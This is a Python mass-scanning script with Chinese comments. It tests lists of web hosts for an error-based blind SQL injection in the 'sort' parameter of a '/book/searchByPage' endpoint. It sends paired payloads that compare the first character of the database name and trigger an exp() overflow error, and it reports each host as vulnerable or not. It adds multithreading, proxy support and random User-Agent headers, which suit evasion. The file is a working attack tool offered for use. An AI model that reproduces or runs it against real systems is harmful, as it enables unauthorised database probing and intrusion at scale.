import argparse
import requests
import os
import json
import random
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# 关闭 SSL 警告
requests.packages.urllib3.disable_warnings()

# 颜色定义
GREEN = '\033[92m'
RED = '\033[91m'
ENDC = '\033[0m'

# 常见 User-Agent 列表
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
]


# 格式化 URL，只保留协议、主机、端口
def clean_url(raw_url):
    try:
        parsed = urlparse(raw_url.strip())
        if parsed.scheme and parsed.netloc:
            return f"{parsed.scheme}://{parsed.netloc}"
        else:
            print(f"{RED}[warning] 无效URL格式：{raw_url}{ENDC}")
            return None
    except Exception as e:
        print(f"{RED}[error] 解析URL失败：{raw_url} - {e}{ENDC}")
        return None


# 发起请求
def request_url(url, proxy=None):
    payload1 = "/book/searchByPage?sort=if(SUBSTR(DATABASE()%2C1%2C1)%3D'n'%2Cexp(709)%2C1)"
    payload2 = "/book/searchByPage?sort=if(SUBSTR(DATABASE()%2C1%2C1)%3D'n'%2Cexp(710)%2C1)"
    user_agent = random.choice(USER_AGENTS)

    headers = {
        "User-Agent": user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "DNT": "1",
        "Connection": "close"
    }

    test_url1 = f'{url}{payload1}'
    test_url2 = f'{url}{payload2}'
    proxies = {
        "http": proxy,
        "https": proxy
    } if proxy else None

    try:
        r1 = requests.get(url=test_url1, headers=headers, proxies=proxies, verify=False, timeout=10)
        r2 = requests.get(url=test_url2, headers=headers, proxies=proxies, verify=False, timeout=10)
        code = json.loads(r2.text).get("code")
        if r1.status_code == 200 and r2.status_code == 200 and code == "500":
            print(f"{GREEN}[Success][{r1.status_code}]{ENDC} {test_url1}")
        else:
            print(f"{RED}[Failure][{r1.status_code}]{ENDC} {test_url1}")
    except requests.exceptions.RequestException as e:
        print(f"{RED}[Error]{ENDC} {test_url1} - {e}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", type=str, help="指定单个 URL 进行测试")
    parser.add_argument("-f", "--file", type=str, help="指定包含多个 URL 的文件路径")
    parser.add_argument("-p", "--proxy", type=str, help="设置代理")
    parser.add_argument("-t", "--threads", type=int, default=1, help="设置并发线程数（默认1）")
    args = parser.parse_args()

    proxy = args.proxy
    threads = args.threads

    url_list = []

    if not args.url and not args.file:
        parser.print_help()
        return

    # 单个 URL
    if args.url:
        clean = clean_url(args.url)
        if clean:
            url_list.append(clean)

    # 从文件读取 URL
    if args.file:
        if not os.path.isfile(args.file):
            print(f"{RED}[error] 文件不存在: {args.file}{ENDC}")
            return
        with open(args.file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    clean = clean_url(line)
                    if clean:
                        url_list.append(clean)

    # 多线程扫描
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for url in url_list:
            futures.append(executor.submit(request_url, url, proxy))

        for future in as_completed(futures):
            pass  # 所有请求在 request_url 内已打印，无需处理返回值


if __name__ == '__main__':
    main()
